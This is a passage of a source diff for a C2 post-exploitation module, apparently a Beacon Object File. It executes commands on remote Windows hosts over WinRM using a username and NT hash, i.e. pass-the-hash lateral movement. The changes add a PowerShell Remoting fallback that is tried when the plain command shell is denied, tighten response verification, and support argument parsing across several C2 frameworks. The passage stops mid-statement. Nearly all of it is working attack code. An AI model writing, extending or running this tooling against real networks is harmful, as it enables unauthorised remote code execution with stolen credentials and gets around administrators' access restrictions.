@@ -4,6 +4,8 @@
 #include "beacon.h"
 #include "ntlm_auth.h"
 #include "ntlm_session.h"
+#include "wsman_shell.h"
+#include "psrp.h"
 
 DECLSPEC_IMPORT LPVOID  WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
 DECLSPEC_IMPORT LPVOID  WINAPI WINHTTP$WinHttpConnect(LPVOID, LPCWSTR, WORD, DWORD);
@@ -66,7 +68,6 @@ typedef LPVOID HINTERNET;
 #define RESP_BUF_SIZE   262144
 #define RAW_ARGS_MAX    4096
 
-/* If you're not testing in prod, are you really living? */
 typedef struct {
     WCHAR target[256];
     WCHAR cmd[2048];
@@ -270,6 +271,80 @@ static void extract_stream_output(const char *xml)
         }
         pos = closeTag + 13;
     }
+}
+
+/* Extract output from PSRP stream data in a Receive response.
+ * Each <rsp:Stream Name="stdout"> element contains base64-encoded
+ * PSRP fragments.  Decode, parse the PSRP message header, and
+ * handle output and state messages.
+ * Returns the pipeline state if a PIPELINE_STATE message was seen,
+ * or -1 if none appeared. */
+static int extract_psrp_stream_output(const char *xml)
+{
+    const char *pos = xml;
+    const char *streamTag;
+    int pipelineState = -1;
+
+    while ((streamTag = MSVCRT$strstr(pos, "<rsp:Stream")) != NULL) {
+        const char *tagEnd = MSVCRT$strstr(streamTag, ">");
+        if (!tagEnd) break;
+        tagEnd++;
+
+        const char *closeTag = MSVCRT$strstr(tagEnd, "</rsp:Stream>");
+        if (!closeTag) break;
+
+        int b64Len = (int)(closeTag - tagEnd);
+        if (b64Len > 0) {
+            BYTE *decoded = NULL;
+            DWORD decodedLen = 0;
+            if (b64_decode(tagEnd, b64Len, &decoded, &decodedLen) &&
+                decoded && decodedLen > 0) {
+                PSRP_MESSAGE msg;
+                if (psrp_parse_fragment(decoded, decodedLen, &msg)) {
+                    switch (msg.messageType) {
+                    case PSRP_PIPELINE_OUTPUT: {
+                        char *text = psrp_extract_text(msg.data);
+                        if (text) {
+                            BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
+                            heap_free(text);
+                        }
+                        break;
+                    }
+                    case PSRP_ERROR_RECORD: {
+                        char *text = psrp_extract_error_text(msg.data);
+                        if (text) {
+                            BeaconPrintf(CALLBACK_ERROR, "%s", text);
+                            heap_free(text);
+                        }
+                        break;
+                    }
+                    case PSRP_PIPELINE_STATE:
+                        pipelineState =
+                            psrp_extract_pipeline_state(msg.data);
+                        break;
+                    case PSRP_VERBOSE_RECORD:
+                    case PSRP_WARNING_RECORD:
+                    case PSRP_DEBUG_RECORD:
+                    case PSRP_INFORMATION_RECORD: {
+                        char *text = psrp_extract_text(msg.data);
+                        if (text) {
+                            BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
+                            heap_free(text);
+                        }
+                        break;
+                    }
+                    default:
+                        /* Ignore unknown message types. */
+                        break;
+                    }
+                    psrp_message_free(&msg);
+                }
+                heap_free(decoded);
+            }
+        }
+        pos = closeTag + 13;
+    }
+    return pipelineState;
 }
 
 static HINTERNET http_post(
@@ -603,7 +678,7 @@ static BOOL wsman_unwrap_body(NTLM_SESSION_SECURITY *session,
     return TRUE;
 }
 
-/* Keep non-success plaintext SOAP faults for diagnostics only. */
+/* Verify protected faults before showing their SOAP body. */
 static HINTERNET wsman_post(
     HINTERNET hConnect,
     LPCWSTR extraHeaders,
@@ -627,23 +702,29 @@ static HINTERNET wsman_post(
         (char *)wrapped, wrappedLen, respBody, respBodyLen, statusCode);
     heap_free(wrapped);
 
-    if (request && *statusCode == 200) {
+    if (request) {
+        BOOL encrypted = wsman_response_is_encrypted(request);
+        BOOL encryptedBody = *respBodyLen &&
+            bytes_at((const BYTE *)*respBody, *respBodyLen, 0,
+                     WSMAN_BOUNDARY);
         char *decrypted = NULL;
         DWORD decryptedLen = 0;
-        if (!wsman_response_is_encrypted(request) || !*respBodyLen ||
-            !wsman_unwrap_body(session, (const BYTE *)*respBody,
-                               *respBodyLen, &decrypted, &decryptedLen)) {
-            BeaconPrintf(CALLBACK_ERROR,
-                "WinRM response failed encrypted MIME or NTLM signature validation");
+        if (*statusCode == 200 || encrypted || encryptedBody) {
+            if (!encrypted || !*respBodyLen ||
+                !wsman_unwrap_body(session, (const BYTE *)*respBody,
+                                   *respBodyLen, &decrypted, &decryptedLen)) {
+                BeaconPrintf(CALLBACK_ERROR,
+                    "WinRM response failed encrypted MIME or NTLM signature validation");
+                heap_free(*respBody);
+                *respBody = NULL;
+                *respBodyLen = 0;
+                WINHTTP$WinHttpCloseHandle(request);
+                return NULL;
+            }
             heap_free(*respBody);
-            *respBody = NULL;
-            *respBodyLen = 0;
-            WINHTTP$WinHttpCloseHandle(request);
-            return NULL;
+            *respBody = decrypted;
+            *respBodyLen = decryptedLen;
         }
-        heap_free(*respBody);
-        *respBody = decrypted;
-        *respBodyLen = decryptedLen;
     }
     return request;
 }
@@ -658,12 +739,141 @@ static void print_http_fault(const char *stage, DWORD status,
     if (!body || bodyLen == 0)
         return;
 
-    shown = bodyLen > 1024 ? 1024 : bodyLen;
+    shown = bodyLen > 2048 ? 2048 : bodyLen;
     saved = body[shown];
     body[shown] = 0;
     BeaconPrintf(CALLBACK_ERROR, "%s response body (%lu%s bytes): %s",
         stage, (unsigned long)shown, bodyLen > shown ? "+" : "", body);
     body[shown] = saved;
+}
+
+/* Parse a verified SOAP body for a structured fault.  Match the subcode
+ * by namespace URI and local name -- never by XML prefix or unverified
+ * text search.  The XML must have been decrypted and signature-checked
+ * by wsman_unwrap_body before reaching this function. */
+static BOOL wsman_parse_fault(const char *xml, WSMAN_FAULT *fault)
+{
+    const char *faultNode, *p, *end;
+    char fullSubcode[384];
+
+    if (!xml || !fault) return FALSE;
+    MSVCRT$memset(fault, 0, sizeof(*fault));
+    fault->kind = WSMAN_FAULT_UNKNOWN;
+
+    /* Locate Fault element regardless of namespace prefix. */
+    faultNode = MSVCRT$strstr(xml, ":Fault");
+    if (!faultNode) faultNode = MSVCRT$strstr(xml, "<Fault");
+    if (!faultNode) return FALSE;
+
+    /* Code > Value */
+    if (!find_xml_value(xml, "<env:Value>", "</env:Value>",
+                        fault->code, sizeof(fault->code)))
+        find_xml_value(xml, "<s:Value>", "</s:Value>",
+                       fault->code, sizeof(fault->code));
+
+    /* Subcode > Value */
+    fullSubcode[0] = 0;
+    if (!find_xml_value(xml, "<env:Subcode>", "</env:Subcode>",
+                        fullSubcode, sizeof(fullSubcode)))
+        find_xml_value(xml, "<s:Subcode>", "</s:Subcode>",
+                       fullSubcode, sizeof(fullSubcode));
+
+    if (fullSubcode[0]) {
+        char subcodeValue[256];
+        subcodeValue[0] = 0;
+        if (find_xml_value(fullSubcode, "<env:Value>", "</env:Value>",
+                           subcodeValue, sizeof(subcodeValue)) ||
+            find_xml_value(fullSubcode, "<s:Value>", "</s:Value>",
+                           subcodeValue, sizeof(subcodeValue))) {
+
+            /* Split "prefix:LocalName". */
+            p = subcodeValue;
+            end = p;
+            while (*end && *end != ':') end++;
+            if (*end == ':') {
+                int prefixLen = (int)(end - p);
+                end++;
+                MSVCRT$_snprintf(fault->subcodeName,
+                    sizeof(fault->subcodeName) - 1, "%s", end);
+
+                /* Resolve the prefix namespace from the envelope. */
+                {
+                    char nsSearch[128];
+                    int nsOff;
+                    MSVCRT$_snprintf(nsSearch, sizeof(nsSearch) - 1, "xmlns:");
+                    nsOff = (int)MSVCRT$strlen(nsSearch);
+                    if (prefixLen < (int)sizeof(nsSearch) - nsOff - 3) {
+                        MSVCRT$memcpy(nsSearch + nsOff, p, prefixLen);
+                        nsSearch[nsOff + prefixLen] = '=';
+                        nsSearch[nsOff + prefixLen + 1] = '"';
+                        nsSearch[nsOff + prefixLen + 2] = 0;
+                        {
+                            const char *nsStart = MSVCRT$strstr(xml, nsSearch);
+                            if (nsStart) {
+                                const char *nsEnd;
+                                int nsLen;
+                                nsStart += MSVCRT$strlen(nsSearch);
+                                nsEnd = MSVCRT$strstr(nsStart, "\"");
+                                if (nsEnd) {
+                                    nsLen = (int)(nsEnd - nsStart);
+                                    if (nsLen > 0 &&
+                                        nsLen < (int)sizeof(fault->subcodeNs)) {
+                                        MSVCRT$memcpy(fault->subcodeNs,
+                                            nsStart, nsLen);
+                                        fault->subcodeNs[nsLen] = 0;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            } else {
+                MSVCRT$_snprintf(fault->subcodeName,
+                    sizeof(fault->subcodeName) - 1, "%s", subcodeValue);
+            }
+        }
+    }
+
+    /* Reason > Text (may have attributes on the element). */
+    if (!find_xml_value(xml, "<env:Text", "</env:Text>",
+                        fault->reason, sizeof(fault->reason)))
+        find_xml_value(xml, "<s:Text", "</s:Text>",
+                       fault->reason, sizeof(fault->reason));
+    if (fault->reason[0]) {
+        p = MSVCRT$strstr(fault->reason, ">");
+        if (p) {
+            int len;
+            p++;
+            len = (int)MSVCRT$strlen(p);
+            MSVCRT$memcpy(fault->reason, p, len + 1);
+        }
+    }
+
+    /* Classify known subcodes by namespace + local name. */
+    if (fault->subcodeName[0]) {
+        BOOL isWsmanNs =
+            (MSVCRT$strstr(fault->subcodeNs,
+                "schemas.dmtf.org/wbem/wsman") != NULL) ||
+            (MSVCRT$strstr(fault->subcodeNs,
+                "schemas.microsoft.com/wbem/wsman") != NULL);
+        if (isWsmanNs) {
+            const char *name = fault->subcodeName;
+            if ((name[0] == 'A' || name[0] == 'a') &&
+                MSVCRT$strstr(name, "ccessDenied"))
+                fault->kind = WSMAN_FAULT_ACCESS_DENIED;
+        }
+    }
+
+    return TRUE;
+}
+
+/* Return TRUE only for a verified AccessDenied SOAP fault. */
+static BOOL wsman_is_access_denied(const char *verifiedXml)
+{
+    WSMAN_FAULT fault;
+    if (!wsman_parse_fault(verifiedXml, &fault))
+        return FALSE;
+    return fault.kind == WSMAN_FAULT_ACCESS_DENIED;
 }
 
 static BOOL extract_type2_from_headers(HINTERNET hReq, BYTE **type2, DWORD *type2Len)
@@ -866,7 +1076,9 @@ static char *build_soap_command(const char *targetUrl, const char *shellId,
 }
 
 static char *build_soap_receive(const char *targetUrl, const char *shellId,
-                                const char *cmdId, int timeoutSec)
+                                const char *cmdId, int timeoutSec,
+                                const char *resourceUri,
+                                const char *desiredStreams)
 {
     char selHdr[512];
     MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
@@ -877,25 +1089,37 @@ static char *build_soap_receive(const char *targetUrl, const char *shellId,
 
     char *hdr = build_soap_header(targetUrl,
         "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
-        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd",
+        resourceUri,
         timeoutSec,
         selHdr);
     if (!hdr) return NULL;
 
     int hdrLen = (int)MSVCRT$strlen(hdr);
-    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
-        "<env:Body>"
-          "<rsp:Receive>"
-            "<rsp:DesiredStream CommandId=\"%s\">stdout stderr</rsp:DesiredStream>"
-          "</rsp:Receive>"
-        "</env:Body>"
-        "</env:Envelope>",
-        cmdId);
+    if (cmdId && cmdId[0]) {
+        MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
+            "<env:Body>"
+              "<rsp:Receive>"
+                "<rsp:DesiredStream CommandId=\"%s\">%s</rsp:DesiredStream>"
+              "</rsp:Receive>"
+            "</env:Body>"
+            "</env:Envelope>",
+            cmdId, desiredStreams);
+    } else {
+        MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
+            "<env:Body>"
+              "<rsp:Receive>"
+                "<rsp:DesiredStream>%s</rsp:DesiredStream>"
+              "</rsp:Receive>"
+            "</env:Body>"
+            "</env:Envelope>",
+            desiredStreams);
+    }
     return hdr;
 }
 
 static char *build_soap_signal(const char *targetUrl, const char *shellId,
-                               const char *cmdId, int timeoutSec)
+                               const char *cmdId, int timeoutSec,
+                               const char *resourceUri)
 {
     char selHdr[512];
     MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
@@ -906,7 +1130,7 @@ static char *build_soap_signal(const char *targetUrl, const char *shellId,
 
     char *hdr = build_soap_header(targetUrl,
         "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal",
-        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd",
+        resourceUri,
         timeoutSec,
         selHdr);
     if (!hdr) return NULL;
@@ -926,7 +1150,7 @@ static char *build_soap_signal(const char *targetUrl, const char *shellId,
 }
 
 static char *build_soap_delete(const char *targetUrl, const char *shellId,
-                               int timeoutSec)
+                               int timeoutSec, const char *resourceUri)
 {
     char selHdr[512];
     MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
@@ -937,7 +1161,7 @@ static char *build_soap_delete(const char *targetUrl, const char *shellId,
 
     char *hdr = build_soap_header(targetUrl,
         "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete",
-        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd",
+        resourceUri,
         timeoutSec,
         selHdr);
     if (!hdr) return NULL;
@@ -949,48 +1173,202 @@ static char *build_soap_delete(const char *targetUrl, const char *shellId,
     return hdr;
 }
 
-static BOOL packed_wstr(const BYTE **cursor, DWORD *left, WCHAR **value)
+/* -----------------------------------------------------------
+ * PSRP SOAP builders
+ * ----------------------------------------------------------- */
+
+/* Build creationXml for a PSRP shell: SESSION_CAPABILITY +
+ * INIT_RUNSPACEPOOL fragments, base64-encoded.
+ * Returns a heap-allocated base64 string; caller frees. */
+static char *build_psrp_creation_xml(const BYTE rpid[16],
+                                     DWORD *b64Len)
 {
-    DWORD length;
-    if (*left < 4) return FALSE;
-    MSVCRT$memcpy(&length, *cursor, 4);
-    *cursor += 4;
-    *left -= 4;
-    if (length < sizeof(WCHAR) || length > *left ||
-        length % sizeof(WCHAR) != 0 ||
-        (*cursor)[length - 2] || (*cursor)[length - 1])
-        return FALSE;
-    for (DWORD i = 0; i + 2 < length; i += 2)
-        if (!(*cursor)[i] && !(*cursor)[i + 1]) return FALSE;
-    *value = (WCHAR *)*cursor;
-    *cursor += length;
-    *left -= length;
-    return TRUE;
+    static const BYTE zeroPid[16] = {0};
+    DWORD scXmlLen = 0, irXmlLen = 0;
+    DWORD scMsgLen = 0, irMsgLen = 0;
+    DWORD scFragLen = 0, irFragLen = 0;
+    char *scXml = NULL, *irXml = NULL;
+    BYTE *scMsg = NULL, *irMsg = NULL;
+    BYTE *scFrag = NULL, *irFrag = NULL;
+    BYTE *combined = NULL;
+    DWORD combinedLen;
+    char *b64Out = NULL;
+
+    scXml = psrp_session_capability_xml(&scXmlLen);
+    if (!scXml) goto fail;
+    scMsg = psrp_build_message(PSRP_DEST_SERVER, PSRP_SESSION_CAPABILITY,
+                               rpid, zeroPid, scXml, scXmlLen, &scMsgLen);
+    heap_free(scXml); scXml = NULL;
+    if (!scMsg) goto fail;
+    scFrag = psrp_build_fragment(1, scMsg, scMsgLen, &scFragLen);
+    heap_free(scMsg); scMsg = NULL;
+    if (!scFrag) goto fail;
+
+    irXml = psrp_init_runspacepool_xml(&irXmlLen);
+    if (!irXml) goto fail;
+    irMsg = psrp_build_message(PSRP_DEST_SERVER, PSRP_INIT_RUNSPACEPOOL,
+                               rpid, zeroPid, irXml, irXmlLen, &irMsgLen);
+    heap_free(irXml); irXml = NULL;
+    if (!irMsg) goto fail;
+    irFrag = psrp_build_fragment(2, irMsg, irMsgLen, &irFragLen);
+    heap_free(irMsg); irMsg = NULL;
+    if (!irFrag) goto fail;
+
+    combinedLen = scFragLen + irFragLen;
+    combined = (BYTE *)heap_alloc(combinedLen);
+    if (!combined) goto fail;
+    MSVCRT$memcpy(combined, scFrag, scFragLen);
+    MSVCRT$memcpy(combined + scFragLen, irFrag, irFragLen);
+    heap_free(scFrag); scFrag = NULL;
+    heap_free(irFrag); irFrag = NULL;
+
+    if (!b64_encode(combined, combinedLen, &b64Out, b64Len)) {
+        heap_free(combined);
+        return NULL;
+    }
+    heap_free(combined);
+    return b64Out;
+
+fail:
+    if (scXml)  heap_free(scXml);
+    if (irXml)  heap_free(irXml);
+    if (scMsg)  heap_free(scMsg);
+    if (irMsg)  heap_free(irMsg);
+    if (scFrag) heap_free(scFrag);
+    if (irFrag) heap_free(irFrag);
+    return NULL;
 }
 
-static BOOL parse_packed_args(const char *buffer, ULONG length, BOF_ARGS *args)
+/* Build wxf:Command arguments for CREATE_PIPELINE (base64-encoded).
+ * |escapedCmd| must be XML-escaped.
+ * Returns a heap-allocated base64 string; caller frees. */
+static char *build_psrp_command_args(const BYTE rpid[16],
+                                     const BYTE pid[16],
+                                     const char *escapedCmd,
+                                     DWORD *b64Len)
 {
-    DWORD declared, left;
-    const BYTE *cursor;
-    if (!buffer || length < 4) return FALSE;
-    MSVCRT$memcpy(&declared, buffer, 4);
-    if (declared != length - 4) return FALSE;
-    cursor = (const BYTE *)buffer + 4;
-    left = declared;
-    if (!packed_wstr(&cursor, &left, &args->target) ||
-        !packed_wstr(&cursor, &left, &args->cmd) ||
-        !packed_wstr(&cursor, &left, &args->username) ||
-        !packed_wstr(&cursor, &left, &args->hash) ||
-        !packed_wstr(&cursor, &left, &args->domain) ||
-        (left != 0 && left != 4 && left != 8))
-        return FALSE;
-    if (left >= 4) {
-        MSVCRT$memcpy(&args->timeout, cursor, 4);
-        cursor += 4;
-        left -= 4;
+    DWORD xmlLen = 0, msgLen = 0, fragLen = 0;
+    char *xml;
+    BYTE *msg, *frag;
+    char *b64Out = NULL;
+
+    xml = psrp_create_pipeline_xml(escapedCmd, &xmlLen);
+    if (!xml) return NULL;
+
+    msg = psrp_build_message(PSRP_DEST_SERVER, PSRP_CREATE_PIPELINE,
+                             rpid, pid, xml, xmlLen, &msgLen);
+    heap_free(xml);
+    if (!msg) return NULL;
+
+    frag = psrp_build_fragment(3, msg, msgLen, &fragLen);
+    heap_free(msg);
+    if (!frag) return NULL;
+
+    if (!b64_encode(frag, fragLen, &b64Out, b64Len)) {
+        heap_free(frag);
+        return NULL;
     }
-    if (left == 4) MSVCRT$memcpy(&args->port, cursor, 4);
-    return TRUE;
+    heap_free(frag);
+    return b64Out;
+}
+
+/* Build SOAP for PSRP shell creation (wxf:Create).
+ * Uses the PowerShell endpoint resource URI and protocol version 2.2.
+ * |rpid| is the RunspacePool GUID (16 bytes, randomly generated). */
+static char *build_soap_create_ps_shell(const char *targetUrl,
+                                        int timeoutSec,
+                                        const BYTE rpid[16])
+{
+    char *creationXml;
+    DWORD creationXmlLen = 0;
+    char *hdr;
+    int hdrLen;
+
+    creationXml = build_psrp_creation_xml(rpid, &creationXmlLen);
+    if (!creationXml) return NULL;
+
+    hdr = build_soap_header(targetUrl,
+        "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
+        PS_RESOURCE_URI,
+        timeoutSec,
+        "<w:OptionSet>"
+          "<w:Option Name=\"protocolversion\">2.2</w:Option>"
+        "</w:OptionSet>");
+    if (!hdr) { heap_free(creationXml); return NULL; }
+
+    hdrLen = (int)MSVCRT$strlen(hdr);
+    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
+        "<env:Body>"
+          "<rsp:Shell>"
+            "<rsp:InputStreams>stdin pr</rsp:InputStreams>"
+            "<rsp:OutputStreams>stdout</rsp:OutputStreams>"
+            "<creationXml xmlns=\"http://schemas.microsoft.com/powershell\">"
+              "%s"
+            "</creationXml>"
+          "</rsp:Shell>"
+        "</env:Body>"
+        "</env:Envelope>",
+        creationXml);
+    heap_free(creationXml);
+    return hdr;
+}
+
+/* Build SOAP for PSRP command execution (wxf:Command).
+ * Sends a CREATE_PIPELINE message containing a script command. */
+static char *build_soap_ps_command(const char *targetUrl,
+                                   const char *shellId,
+                                   const char *cmd,
+                                   int timeoutSec,
+                                   const BYTE rpid[16],
+                                   const BYTE pid[16])
+{
+    char selHdr[512];
+    char *escapedCmd, *cmdArgs;
+    DWORD cmdArgsLen = 0;
+    char *hdr;
+    int hdrLen;
+
+    MSVCRT$_snprintf(selHdr, sizeof(selHdr) - 1,
+        "<w:SelectorSet>"
+          "<w:Selector Name=\"ShellId\">%s</w:Selector>"
+        "</w:SelectorSet>",
+        shellId);
+
+    {
+        DWORD cmdLen = (DWORD)MSVCRT$strlen(cmd);
+        DWORD wrapLen = cmdLen + 64;
+        char *wrapped = (char *)heap_alloc(wrapLen);
+        if (!wrapped) return NULL;
+        MSVCRT$_snprintf(wrapped, wrapLen - 1,
+            "&{$ProgressPreference='SilentlyContinue';%s}|Out-String", cmd);
+        escapedCmd = xml_escape_text(wrapped);
+        heap_free(wrapped);
+    }
+    if (!escapedCmd) return NULL;
+
+    cmdArgs = build_psrp_command_args(rpid, pid, escapedCmd, &cmdArgsLen);
+    heap_free(escapedCmd);
+    if (!cmdArgs) return NULL;
+
+    hdr = build_soap_header(targetUrl,
+        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
+        PS_RESOURCE_URI,
+        timeoutSec,
+        selHdr);
+    if (!hdr) { heap_free(cmdArgs); return NULL; }
+
+    hdrLen = (int)MSVCRT$strlen(hdr);
+    MSVCRT$_snprintf(hdr + hdrLen, SOAP_BUF_SIZE - hdrLen - 1,
+        "<env:Body>"
+          "<rsp:CommandLine>"
+            "<rsp:Command />"
+            "<rsp:Arguments>%s</rsp:Arguments>"
+          "</rsp:CommandLine>"
+        "</env:Body>"
+        "</env:Envelope>",
+        cmdArgs);
+    heap_free(cmdArgs);
+    return hdr;
 }
 
 static BOOL raw_space(char c)
@@ -1145,19 +1523,37 @@ VOID go(IN PCHAR Buffer, IN ULONG Length)
     args.timeout = 15000;
     args.port = 5985;
 
-    DWORD declared = 0;
-    if (Buffer && Length >= 4) MSVCRT$memcpy(&declared, Buffer, 4);
-    if (Buffer && Length >= 4 && declared == Length - 4) {
-        if (!parse_packed_args(Buffer, Length, &args)) {
-            BeaconPrintf(CALLBACK_ERROR, "Missing or malformed BOF arguments");
-            goto cleanup_http;
+    /* Try standard BeaconData API first (works on Xenon, CS, Sliver, etc.) */
+    if (Buffer && Length >= 4) {
+        datap parser;
+        BeaconDataParse(&parser, Buffer, Length);
+
+        args.target   = (WCHAR *)BeaconDataExtract(&parser, NULL);
+        args.cmd      = (WCHAR *)BeaconDataExtract(&parser, NULL);
+        args.username = (WCHAR *)BeaconDataExtract(&parser, NULL);
+        args.hash     = (WCHAR *)BeaconDataExtract(&parser, NULL);
+        args.domain   = (WCHAR *)BeaconDataExtract(&parser, NULL);
+
+        if (BeaconDataLength(&parser) >= 4)
+            args.timeout = BeaconDataInt(&parser);
+        if (BeaconDataLength(&parser) >= 4)
+            args.port = BeaconDataInt(&parser);
+
+        if (!args.target || !args.cmd || !args.username ||
+            !args.hash || !args.domain) {
+            /* Beacon API didn't work -- fall back to raw text parsing */
+            MSVCRT$memset(&args, 0, sizeof(args));
+            args.timeout = 15000;
+            args.port = 5985;
+            rawArgs = heap_alloc(sizeof(*rawArgs));
+            if (!rawArgs || !parse_raw_args(Buffer, Length, rawArgs, &args)) {
+                BeaconPrintf(CALLBACK_ERROR, "Missing or malformed BOF arguments");
+                goto cleanup_http;
+            }
         }
     } else {
-        rawArgs = heap_alloc(sizeof(*rawArgs));
-        if (!rawArgs || !parse_raw_args(Buffer, Length, rawArgs, &args)) {
-            BeaconPrintf(CALLBACK_ERROR, "Missing or malformed BOF arguments");
-            goto cleanup_http;
-        }
+        BeaconPrintf(CALLBACK_ERROR, "Missing or malformed BOF arguments");
+        goto cleanup_http;
     }
     target = args.target;
     cmd = args.cmd;
@@ -1440,113 +1836,362 @@ VOID go(IN PCHAR Buffer, IN ULONG Length)
         goto cleanup_http;
     }
 
+    /* -----------------------------------------------------------
+     * Decide text-shell or PSRP fallback.
+     *
+     * Try text shell first.  Retry with PSRP only after a
+     * protected, successfully verified AccessDenied fault.
+     * Never retry on 401, malformed MIME, bad NTLM signatures,
+     * missing session state, or a transport failure.
+     * ----------------------------------------------------------- */
+
+    BOOL tryPsrp = FALSE;
+
     if (status2 != 200) {
-        print_http_fault("CreateShell", status2, resp2, resp2Len);
+        if (status2 != 401 && resp2 &&
+            wsman_is_access_denied(resp2)) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                "[*] Text shell access denied; trying PowerShell backend");
+            tryPsrp = TRUE;
+        } else if (status2 == 401) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "Authentication failed (401). "
+                "Check NT hash/username/domain.");
+        } else {
+            print_http_fault("CreateShell", status2, resp2, resp2Len);
+        }
         if (resp2) heap_free(resp2);
         WINHTTP$WinHttpCloseHandle(hReq2);
-        goto cleanup_http;
+        if (!tryPsrp) goto cleanup_http;
     }
 
-    char shellId[128];
-    MSVCRT$memset(shellId, 0, sizeof(shellId));
-    if (!extract_shell_id(resp2, shellId, sizeof(shellId))) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to extract ShellId from response");
+    /* -----------------------------------------------------------
+     * Text command shell lifecycle.
+     * ----------------------------------------------------------- */
+
+    if (!tryPsrp) {
+        char shellId[128];
+        MSVCRT$memset(shellId, 0, sizeof(shellId));
+        if (!extract_shell_id(resp2, shellId, sizeof(shellId))) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "Failed to extract ShellId from response");
+            if (resp2) heap_free(resp2);
+            WINHTTP$WinHttpCloseHandle(hReq2);
+            goto cleanup_http;
+        }
         if (resp2) heap_free(resp2);
         WINHTTP$WinHttpCloseHandle(hReq2);
-        goto cleanup_http;
-    }
-    if (resp2) heap_free(resp2);
-    WINHTTP$WinHttpCloseHandle(hReq2);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shell created: %s", shellId);
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[+] Shell created (cmd): %s", shellId);
 
-    char *cmdSoap = build_soap_command(targetUrl, shellId, cmdN, timeoutSec);
-    if (!cmdSoap) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to build Command SOAP");
-        goto cleanup_shell;
-    }
+        char *cmdSoap = build_soap_command(targetUrl, shellId, cmdN,
+                                           timeoutSec);
+        if (!cmdSoap) {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to build Command SOAP");
+            goto cleanup_cmd_shell;
+        }
 
-    char *resp3 = NULL;
-    DWORD resp3Len = 0, status3 = 0;
-    HINTERNET hReq3 = wsman_post(hConnect, NULL, &ntlmSession,
-        cmdSoap, (DWORD)MSVCRT$strlen(cmdSoap),
-        &resp3, &resp3Len, &status3);
-    heap_free(cmdSoap);
+        char *resp3 = NULL;
+        DWORD resp3Len = 0, status3 = 0;
+        HINTERNET hReq3 = wsman_post(hConnect, NULL, &ntlmSession,
+            cmdSoap, (DWORD)MSVCRT$strlen(cmdSoap),
+            &resp3, &resp3Len, &status3);
+        heap_free(cmdSoap);
 
-    if (!hReq3 || status3 != 200) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "RunCommand failed (HTTP %d)", status3);
-        if (resp3) heap_free(resp3);
-        if (hReq3) WINHTTP$WinHttpCloseHandle(hReq3);
-        goto cleanup_shell;
-    }
+        if (!hReq3 || status3 != 200) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "RunCommand failed (HTTP %d)", status3);
+            if (resp3) heap_free(resp3);
+            if (hReq3) WINHTTP$WinHttpCloseHandle(hReq3);
+            goto cleanup_cmd_shell;
+        }
 
-    char cmdId[128];
-    MSVCRT$memset(cmdId, 0, sizeof(cmdId));
-    if (!extract_command_id(resp3, cmdId, sizeof(cmdId))) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to extract CommandId");
+        char cmdId[128];
+        MSVCRT$memset(cmdId, 0, sizeof(cmdId));
+        if (!extract_command_id(resp3, cmdId, sizeof(cmdId))) {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to extract CommandId");
+            if (resp3) heap_free(resp3);
+            WINHTTP$WinHttpCloseHandle(hReq3);
+            goto cleanup_cmd_shell;
+        }
         if (resp3) heap_free(resp3);
         WINHTTP$WinHttpCloseHandle(hReq3);
-        goto cleanup_shell;
-    }
-    if (resp3) heap_free(resp3);
-    WINHTTP$WinHttpCloseHandle(hReq3);
 
-    int maxIter = 50;
-    while (maxIter-- > 0) {
-        char *recvSoap = build_soap_receive(targetUrl, shellId, cmdId,
-                                            timeoutSec);
-        if (!recvSoap) break;
+        int maxIter = 50;
+        while (maxIter-- > 0) {
+            char *recvSoap = build_soap_receive(targetUrl, shellId, cmdId,
+                timeoutSec, CMD_RESOURCE_URI, "stdout stderr");
+            if (!recvSoap) break;
 
-        char *resp4 = NULL;
-        DWORD resp4Len = 0, status4 = 0;
-        HINTERNET hReq4 = wsman_post(hConnect, NULL, &ntlmSession,
-            recvSoap, (DWORD)MSVCRT$strlen(recvSoap),
-            &resp4, &resp4Len, &status4);
-        heap_free(recvSoap);
+            char *resp4 = NULL;
+            DWORD resp4Len = 0, status4 = 0;
+            HINTERNET hReq4 = wsman_post(hConnect, NULL, &ntlmSession,
+                recvSoap, (DWORD)MSVCRT$strlen(recvSoap),
+                &resp4, &resp4Len, &status4);
+            heap_free(recvSoap);
 
-        if (!hReq4 || status4 != 200) {
-            if (resp4) heap_free(resp4);
-            if (hReq4) WINHTTP$WinHttpCloseHandle(hReq4);
-            break;
+            if (!hReq4 || status4 != 200) {
+                if (resp4) heap_free(resp4);
+                if (hReq4) WINHTTP$WinHttpCloseHandle(hReq4);
+                break;
+            }
+
+            extract_stream_output(resp4);
+
+            BOOL done = check_command_done(resp4);
+            heap_free(resp4);
+            WINHTTP$WinHttpCloseHandle(hReq4);
+
+            if (done) break;
         }
 
-        extract_stream_output(resp4);
+        {
+            char *sigSoap = build_soap_signal(targetUrl, shellId, cmdId,
